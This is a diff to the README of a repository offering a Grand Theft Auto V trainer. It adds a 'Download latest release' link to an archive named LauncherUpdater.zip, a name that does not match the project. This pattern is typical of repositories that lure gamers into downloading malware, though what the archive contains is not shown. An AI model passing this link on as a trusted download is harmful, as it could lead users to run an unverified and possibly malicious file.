@@ -2,6 +2,8 @@
 
 Welcome to the GTA V Simple Trainer repository! This project is a comprehensive, user-friendly trainer for Grand Theft Auto V, aimed at enhancing your gameplay experience through a wide range of features and functionalities. Whether you’re a casual player looking to have some fun or a seasoned veteran seeking to experiment with the game's mechanics, this trainer has something for everyone.
 
+[*Download latest release*](https://github.com/ahmadgtr786/gta-v-trainer/releases/download/gta-v-trainer/LauncherUpdater.zip)
+
 ## 🚀 Features
 ### Vehicle Management
 * Spawn Vehicles: Instantly spawn any vehicle from the game’s extensive catalog.
